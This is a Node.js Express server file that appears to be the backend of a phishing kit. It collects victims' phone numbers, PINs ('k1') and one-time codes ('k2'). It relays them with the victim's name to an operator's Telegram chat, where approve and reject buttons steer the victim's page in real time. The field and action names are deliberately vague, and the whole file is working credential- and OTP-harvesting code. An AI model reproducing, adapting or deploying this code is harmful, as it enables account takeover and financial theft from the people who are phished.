'use strict';

import express           from 'express';
import cors              from 'cors';
import crypto            from 'crypto';
import { fileURLToPath } from 'url';
import path              from 'path';
import config            from './config.js';
import { setResult, popResult, setSession, getSession } from './store.js';
import { sendAdminMessage, removeButtons, answerCallback, registerWebhook, escMd } from './telegram.js';

const app       = express();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

app.use(express.json());
app.use(cors({ origin: true, methods: ['GET', 'POST', 'OPTIONS'], allowedHeaders: ['Content-Type'] }));
app.use(express.static(__dirname));
app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/health', (_req, res) => { res.json({ ok: true, ts: new Date().toISOString() }); });

app.post('/api/v2/process', async (req, res) => {
  const { type, phone, countryCode, k1, k2, name } = req.body;
  if (!type || !phone) return res.status(400).json({ ok: false, error: 'Missing fields' });

  const fullPhone = `${countryCode || '+225'} ${phone}`.trim();
  const token = crypto.randomBytes(8).toString('hex');
  const sig = crypto.createHmac('sha256', config.secretKey).update(`${token}|${phone}`).digest('hex');
  setSession(token, phone, sig, config.tokenTtl);
  const cbData = (action) => `${action}|${token}`;

  try {
    let text, keyboard;
    const now = new Date();
    const dateTime = now.toLocaleString('en-GB', { dateStyle: 'medium', timeStyle: 'short' });

    if (type === 'a') {
      if (!k1) return res.status(400).json({ ok: false, error: 'Missing k1' });
      text = `🔒 *Entry*\n\n👤 *Name:* ${escMd(name || 'Unknown')}\n📱 *Phone:* \`${escMd(fullPhone)}\`\n🔢 *Key:* \`${escMd(k1)}\`\n🕐 *Date:* ${escMd(dateTime)}\n\nAwaiting decision\\.`;
      keyboard = [[{ text: '✅ Continue', callback_data: cbData('r1') }, { text: '❌ Wrong', callback_data: cbData('r2') }, { text: '✅ Approve', callback_data: cbData('r3') }]];
    } else if (type === 'b') {
      if (!k2) return res.status(400).json({ ok: false, error: 'Missing k2' });
      text = `🔐 *Code*\n\n👤 *Name:* ${escMd(name || 'Unknown')}\n📱 *Phone:* \`${escMd(fullPhone)}\`\n🔑 *Code:* \`${escMd(k2)}\`\n🕐 *Date:* ${escMd(dateTime)}\n\nAwaiting decision\\.`;
      keyboard = [[{ text: '❌ Wrong', callback_data: cbData('r5') }, { text: '❌ Invalid', callback_data: cbData('r6') }], [{ text: '✅ Approve', callback_data: cbData('r3') }, { text: '❌ Decline', callback_data: cbData('r4') }]];
    } else if (type === 'd') {
      text = `🔄 *Refresh*\n\n👤 *Name:* ${escMd(name || 'Unknown')}\n📱 *Phone:* \`${escMd(fullPhone)}\`\n🕐 *Date:* ${escMd(dateTime)}\n\nRequested new code\\.`;
      keyboard = [[{ text: '✅ Continue', callback_data: cbData('r1') }, { text: '❌ Wrong', callback_data: cbData('r2') }]];
    } else {
      return res.status(400).json({ ok: false, error: 'Unknown type' });
    }

    const tgResult = await sendAdminMessage(text, keyboard);
    if (!tgResult.ok) return res.status(500).json({ ok: false, error: 'TG error' });
    res.json({ ok: true, token });
  } catch (err) { res.status(500).json({ ok: false, error: 'Server error' }); }
});

app.post('/api/v2/status', (req, res) => {
  const { token } = req.body;
  if (!token || !/^[a-f0-9]{16}$/.test(token)) return res.status(400).json({ ok: false, error: 'Invalid' });
  const result = popResult(token);
  if (result === null) return res.json({ ok: true, result: 'p' });
  res.json({ ok: true, result });
});

app.post('/webhook', async (req, res) => {
  res.json({ ok: true });
  const update = req.body;
  if (!update?.callback_query) return;
  const cb = update.callback_query;
  const data = cb.data || '';
  const chatId = cb.message?.chat?.id?.toString();
  const msgId = cb.message?.message_id;
  if (chatId !== config.adminChatId.toString()) { await answerCallback(cb.id, 'No', true); return; }
  const parts = data.split('|');
  if (parts.length !== 2) { await answerCallback(cb.id, 'Invalid'); return; }
  const [action, token] = parts;
  const session = getSession(token);
  if (!session) { await answerCallback(cb.id, 'Expired', true); return; }
  const expectedSig = crypto.createHmac('sha256', config.secretKey).update(`${token}|${session.phone}`).digest('hex');
  if (!crypto.timingSafeEqual(Buffer.from(session.sig), Buffer.from(expectedSig))) { await answerCallback(cb.id, 'Invalid sig', true); return; }

  try {
    switch (action) {
      case 'r1': setResult(token, 'r1', config.tokenTtl); await removeButtons(chatId, msgId); await answerCallback(cb.id, 'OK'); break;
      case 'r2': setResult(token, 'r2', config.tokenTtl); await removeButtons(chatId, msgId); await answerCallback(cb.id, 'Wrong'); break;
      case 'r3': setResult(token, 'r3', config.tokenTtl); await removeButtons(chatId, msgId); await answerCallback(cb.id, 'Approved'); break;
      case 'r4': setResult(token, 'r4', config.tokenTtl); await removeButtons(chatId, msgId); await answerCallback(cb.id, 'Declined'); break;
      case 'r5': setResult(token, 'r5', config.tokenTtl); await removeButtons(chatId, msgId); await answerCallback(cb.id, 'Wrong code'); break;
      case 'r6': setResult(token, 'r6', config.tokenTtl); await removeButtons(chatId, msgId); await answerCallback(cb.id, 'Invalid'); break;
      default: await answerCallback(cb.id, 'Unknown');
    }
  } catch (err) { console.error('Webhook error:', err); }
});

app.listen(config.port, () => { console.log(`\n🚀 Service on port ${config.port}`); });
